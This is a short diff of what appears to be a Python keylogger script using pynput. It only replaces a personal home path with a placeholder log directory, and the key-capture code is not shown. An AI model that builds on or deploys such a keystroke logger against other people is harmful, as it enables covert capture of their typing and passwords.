@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 import logging
 
-logDir = '/home/gabriel/'
+logDir = '/PREFERRED_DIRECTORY/'
 
 logging.basicConfig(filename=(logDir + 'log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
